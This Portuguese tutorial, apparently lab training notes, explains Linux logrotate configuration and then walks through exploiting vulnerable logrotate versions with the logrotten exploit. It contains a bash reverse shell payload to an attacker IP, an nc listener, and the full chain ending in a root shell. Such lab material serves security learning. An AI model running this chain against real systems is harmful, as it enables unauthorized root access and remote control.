Sistemas Linux geram uma grande quantidade de arquivos de log, que podem eventualmente encher o disco rígido se não forem gerenciados adequadamente. Para evitar isso, a ferramenta **logrotate** é utilizada para arquivar ou descartar logs antigos, garantindo que eles não ocupem todo o espaço disponível.

Isso também facilita a pesquisa de informações nos logs, economizando tempo. Os logs, localizados em **/var/log**, são essenciais para os administradores, pois ajudam a identificar causas de falhas e monitorar se todos os serviços estão funcionando corretamente.

`Logrotate`tem muitos recursos para gerenciar esses arquivos de log. Eles incluem a especificação de:

- o `size` do arquivo de log,
- isso é `age`,
- e a `action` a ser tomada quando um desses fatores for atingido.

```shell-session
NycolasES6@htb[/htb]$ man logrotate
NycolasES6@htb[/htb]$ # or
NycolasES6@htb[/htb]$ logrotate --help

Usage: logrotate [OPTION...] <configfile>
  -d, --debug               Don't do anything, just test and print debug messages
  -f, --force               Force file rotation
  -m, --mail=command        Command to send mail (instead of '/usr/bin/mail')
  -s, --state=statefile     Path of state file
      --skip-state-lock     Do not lock the state file
  -v, --verbose             Display messages during rotation
  -l, --log=logfile         Log file or 'syslog' to log to syslog
      --version             Display version information

Help options:
  -?, --help                Show this help message
      --usage               Display brief usage message
```

A função da rotação em si consiste em renomear os arquivos de log. Por exemplo, novos arquivos de log podem ser criados para cada novo dia, e os mais antigos serão renomeados automaticamente.
Outro exemplo disso seria esvaziar o arquivo de log mais antigo e, assim, reduzir o consumo de memória.

Esta ferramenta é geralmente iniciada periodicamente via `cron` e controlada via o arquivo de configuração `/etc/logrotate.conf`. Dentro deste arquivo, ele contém configurações globais que determinam a função de `logrotate`.

```shell-session
NycolasES6@htb[/htb]$ cat /etc/logrotate.conf


# see "man logrotate" for details

# global options do not affect preceding include directives

# rotate log files weekly
weekly

# use the adm group by default, since this is the owning group
# of /var/log/syslog.
su root adm

# keep 4 weeks worth of backlogs
rotate 4

# create new (empty) log files after rotating old ones
create

# use date as a suffix of the rotated file
#dateext

# uncomment this if you want your log files compressed
#compress

# packages drop log rotation information into this directory
include /etc/logrotate.d

# system-specific logs may also be configured here.
```

Para forçar uma nova rotação no mesmo dia, podemos definir a data após os arquivos de log individuais no arquivo de status `/var/lib/logrotate.status`ou usar a opção `-f`/ :`--force`

```shell-session
NycolasES6@htb[/htb]$ sudo cat /var/lib/logrotate.status

/var/log/samba/log.smbd" 2022-8-3
/var/log/mysql/mysql.log" 2022-8-3
```

Podemos encontrar os arquivos de configuração correspondentes no diretório `/etc/logrotate.d/`.

```shell-session
NycolasES6@htb[/htb]$ ls /etc/logrotate.d/

alternatives  apport  apt  bootlog  btmp  dpkg  mon  rsyslog  ubuntu-advantage-tools  ufw  unattended-upgrades  wtmp
```

```shell-session
NycolasES6@htb[/htb]$ cat /etc/logrotate.d/dpkg

/var/log/dpkg.log {
        monthly
        rotate 12
        compress
        delaycompress
        missingok
        notifempty
        create 644 root root
}
```

Para explorar `logrotate`, precisamos de alguns requisitos que temos que cumprir.

1. precisamos de permissões `write` nos arquivos de log
2. ``logrotate`` deve ser executado como um usuário privilegiado ou`root`
3. versões vulneráveis:
    - 3.8.6
    - 3.11.0
    - 3.15.0
    - 3.18.0

Há um exploit pré-fabricado que podemos usar para isso se os requisitos forem atendidos. Esse exploit é chamado [logrotten](https://github.com/whotwagner/logrotten) .

  Podemos baixá-lo e compilá-lo em um kernel similar do sistema de destino e então transferi-lo para o sistema de destino.Alternativamente, se pudermos compilar o código no sistema de destino, então podemos fazê-lo diretamente no sistema de destino.

```shell-session
logger@nix02:~$ git clone https://github.com/whotwagner/logrotten.git
logger@nix02:~$ cd logrotten
logger@nix02:~$ gcc logrotten.c -o logrotten
```

Em seguida, precisamos que uma carga útil seja executada. Neste exemplo, executaremos um shell reverso simples baseado em bash.

```shell-session
logger@nix02:~$ echo 'bash -i >& /dev/tcp/10.10.14.2/9001 0>&1' > payload
```

Entretanto, antes de executar o exploit, precisamos determinar qual opção `logrotate` usa em `logrotate.conf`.

```shell-session
logger@nix02:~$ grep "create\|compress" /etc/logrotate.conf | grep -v "#"

create
```

No nosso caso, é a opção: `create`. Portanto, temos que usar o exploit adaptado a esta função.

Depois disso, temos que iniciar um ouvinte em nossa VM / Pwnbox, que aguarda a conexão do sistema de destino.

```shell-session
NycolasES6@htb[/htb]$ nc -nlvp 9001

Listening on 0.0.0.0 9001
```

Como etapa final, executamos o exploit com a carga útil preparada e aguardamos um shell reverso como usuário privilegiado ou root.

```shell-session
logger@nix02:~$ ./logrotten -p ./payload /tmp/tmp.log
```

```shell-session
...
Listening on 0.0.0.0 9001

Connection received on 10.129.24.11 49818
# id

uid=0(root) gid=0(root) groups=0(root)
```























